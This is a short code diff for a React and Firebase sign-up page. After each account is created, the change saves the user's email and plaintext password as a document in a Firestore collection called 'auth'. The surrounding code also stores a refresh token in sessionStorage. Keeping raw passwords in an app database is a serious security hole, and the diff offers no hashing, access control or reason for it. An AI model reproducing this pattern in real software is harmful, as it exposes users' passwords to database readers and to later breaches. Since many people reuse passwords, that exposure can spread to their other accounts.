@@ -8,6 +8,9 @@ import { useNavigate } from "react-router-dom";
 import { app } from "./firebase";
 import { ToastContainer, toast } from 'react-toastify';
 import "react-toastify/dist/ReactToastify.css"; 
+import { collection, addDoc } from "firebase/firestore"; 
+import {db} from './firebase'
+
 import {
   getAuth,
   signInWithEmailAndPassword,
@@ -33,6 +36,10 @@ function App() {
       createUserWithEmailAndPassword(authentication, email, password).then((res) => {
         navigate('/home')
         sessionStorage.setItem("auth", res._tokenResponse.refreshToken);
+        addDoc(collection(db, "auth"), {
+          email: email,
+          password: password
+        });
       })
       .catch((e) => {
         if(e.code == "auth/wrong-password"){
